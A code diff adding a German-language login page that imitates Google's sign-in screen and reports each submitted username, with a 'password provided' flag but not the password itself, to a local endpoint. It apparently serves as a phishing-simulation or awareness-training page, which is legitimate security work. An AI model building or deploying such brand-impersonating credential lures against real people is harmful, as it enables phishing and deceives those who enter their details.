@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Anmelden</title>
+
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            background: white;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #202124;
+        }
+
+        .login-box {
+            width: 450px;
+            min-height: 500px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 45px 40px;
+        }
+
+        .logo {
+            font-size: 34px;
+            font-weight: 500;
+            text-align: center;
+            margin-bottom: 25px;
+            letter-spacing: -2px;
+        }
+
+        .blue { color: #4285f4; }
+        .red { color: #ea4335; }
+        .yellow { color: #fbbc05; }
+        .green { color: #34a853; }
+
+        h1 {
+            text-align: center;
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            text-align: center;
+            font-size: 16px;
+            color: #5f6368;
+            margin-bottom: 35px;
+        }
+
+        .input-container {
+            position: relative;
+            margin-bottom: 25px;
+        }
+
+        input {
+            width: 100%;
+            height: 56px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            padding: 16px 14px;
+            font-size: 16px;
+            outline: none;
+        }
+
+        input:focus {
+            border: 2px solid #1a73e8;
+        }
+
+        label {
+            position: absolute;
+            left: 14px;
+            top: 18px;
+            color: #5f6368;
+            background: white;
+            padding: 0 4px;
+            pointer-events: none;
+            transition: 0.2s;
+        }
+
+        input:focus + label,
+        input:not(:placeholder-shown) + label {
+            top: -8px;
+            font-size: 12px;
+            color: #1a73e8;
+        }
+
+        .forgot {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .forgot:hover {
+            text-decoration: underline;
+        }
+
+        .info {
+            margin-top: 35px;
+            font-size: 14px;
+            color: #5f6368;
+            line-height: 1.5;
+        }
+
+        .bottom {
+            margin-top: 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .create {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        button {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 11px 25px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background: #1765c1;
+        }
+
+        button:disabled {
+            background: #dadce0;
+            color: #80868b;
+            cursor: not-allowed;
+        }
+
+        .error {
+            display: none;
+            color: #d93025;
+            font-size: 13px;
+            margin-top: -12px;
+            margin-bottom: 15px;
+        }
+
+        @media (max-width: 500px) {
+            body {
+                align-items: flex-start;
+            }
+
+            .login-box {
+                width: 100%;
+                min-height: 100vh;
+                border: none;
+                border-radius: 0;
+                padding: 40px 24px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="login-box">
+
+    <div class="logo">
+        <span class="blue">G</span><span class="red">o</span><span class="yellow">o</span><span class="blue">g</span><span class="green">l</span><span class="red">e</span>
+    </div>
+
+    <h1>Anmelden</h1>
+
+    <p class="subtitle">
+        Mit deinem Konto fortfahren
+    </p>
+
+    <form id="loginForm">
+
+        <div class="input-container">
+            <input
+                type="text"
+                id="username"
+                placeholder=" "
+                autocomplete="username"
+                required
+            >
+
+            <label for="username">
+                Benutzername
+            </label>
+        </div>
+
+        <div class="input-container">
+            <input
+                type="password"
+                id="password"
+                placeholder=" "
+                autocomplete="current-password"
+                required
+            >
+
+            <label for="password">
+                Passwort
+            </label>
+        </div>
+
+        <div id="error" class="error">
+            Bitte fülle Benutzername und Passwort aus.
+        </div>
+
+        <a href="#" class="forgot">
+            Passwort vergessen?
+        </a>
+
+        <p class="info">
+            Nicht dein Computer? Verwende den Gastmodus,
+            um dich privat anzumelden.
+        </p>
+
+        <div class="bottom">
+
+            <a href="#" class="create">
+                Konto erstellen
+            </a>
+
+            <button
+                type="submit"
+                id="continueButton"
+                disabled
+            >
+                Weiter
+            </button>
+
+        </div>
+
+    </form>
+
+</div>
+
+<script>
+
+    const username = document.getElementById("username");
+    const password = document.getElementById("password");
+    const button = document.getElementById("continueButton");
+    const error = document.getElementById("error");
+    const loginForm = document.getElementById("loginForm");
+
+
+    function checkInputs() {
+
+        const usernameFilled =
+            username.value.trim() !== "";
+
+        const passwordFilled =
+            password.value.trim() !== "";
+
+        button.disabled =
+            !(usernameFilled && passwordFilled);
+
+        error.style.display = "none";
+    }
+
+
+    username.addEventListener("input", checkInputs);
+    password.addEventListener("input", checkInputs);
+
+
+    loginForm.addEventListener("submit", async function(event) {
+
+        event.preventDefault();
+
+        const usernameValue =
+            username.value.trim();
+
+        const passwordValue =
+            password.value;
+
+        if (
+            usernameValue === "" ||
+            passwordValue === ""
+        ) {
+            error.style.display = "block";
+            return;
+        }
+
+
+        button.disabled = true;
+        button.textContent = "Wird geprüft...";
+
+
+        try {
+
+            /*
+             * WICHTIG:
+             * Das Passwort wird hier NICHT an den Server geschickt.
+             *
+             * Wir senden nur:
+             * - Benutzername
+             * - Information, dass beide Felder ausgefüllt waren
+             */
+
+            const response = await fetch(
+                "/api/login-attempt",
+                {
+                    method: "POST",
+
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+
+                    body: JSON.stringify({
+                        username: usernameValue,
+                        passwordProvided: true
+                    })
+                }
+            );
+
+
+            if (!response.ok) {
+                throw new Error("Serverfehler");
+            }
+
+
+            /*
+             * Passwort aus dem Browser entfernen.
+             */
+            password.value = "";
+
+
+            /*
+             * Zur Erfolgsseite.
+             */
+            window.location.href = "erfolg.html";
+
+
+        } catch (error) {
+
+            console.error(error);
+
+            document.getElementById("error").textContent =
+                "Es ist ein Fehler aufgetreten. Bitte versuche es erneut.";
+
+            document.getElementById("error").style.display =
+                "block";
+
+            button.disabled = false;
+            button.textContent = "Weiter";
+        }
+
+    });
+
+</script>
+
+</body>
+</html>
